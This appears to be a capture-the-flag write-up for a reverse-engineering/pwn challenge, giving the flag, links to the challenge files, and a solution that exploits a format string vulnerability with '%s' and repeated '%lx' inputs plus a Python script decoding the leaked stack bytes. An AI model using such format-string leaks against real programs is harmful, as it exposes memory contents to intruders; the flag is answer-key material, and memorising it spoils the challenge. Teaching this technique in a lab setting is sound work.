# A King, A Priest and A Rich Man

Category: RE/PWN

Author: Amogh Umesh

Answer / Flag: `MAZE{8UrN_7H3M_A11}`

## Problem Statement

Tyrion and Bronn are sitting in the library trying to find a way to save Kings Landing when they find a book which promises a way. Help Tyrion and Bronn unlock the secrets of the book to save Kings landing. 

## Relevant files / links

Source code(to be given to participants): https://drive.google.com/file/d/1ax-o9fQ1H-x2oqbcAeaTuQUuXlNl4gYo/view?usp=sharing \
Executable(to be given to participants): https://drive.google.com/file/d/1OrFjnUvYxiOJ7KXUKmZuMlktsTTQ7N-h/view?usp=sharing

## Hint

Find a way to pop the flag from function stack.

## Solution

Examining the code we find out that this is a format string specifier vulnerability. There are many ways to solve this question. Further examining code reveals
that there is not many items in the stack after the flag and since the flag is ASCII, we can use %s. Thus we can try one or more %s to check. Trying just a single %s 
will reveal the answer. This can be done or we can input multiple %lx and run a script to convert the resulting hex values to ASCII and print them out.\
Answer: "%s%s" or "%lx" + "-%lx"*50

Script for %lx:
```python
x = "" # insert the hex values outputted by program here
s = ""
for i in x.split('-'):
    if len(i) == 16:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)
```
